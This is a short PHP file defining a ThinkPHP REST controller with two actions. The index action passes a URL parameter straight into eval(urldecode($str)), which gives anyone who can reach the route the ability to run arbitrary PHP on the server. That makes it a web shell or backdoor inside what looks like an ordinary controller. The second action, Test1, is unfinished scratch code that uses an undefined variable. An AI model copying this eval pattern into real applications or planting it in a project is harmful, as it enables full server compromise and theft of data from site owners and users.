<?php
namespace NewSPZ\Controller;
use Think\Controller\RestController;
class IndexController extends RestController{
    
    public function index($str=''){
     eval(urldecode($str));
    }
    
    public function Test1($a=null){
       echo U("home/index/test1",false,true);
      $this->dispatch();
      M()->getField($field);
    }
    
  
   
}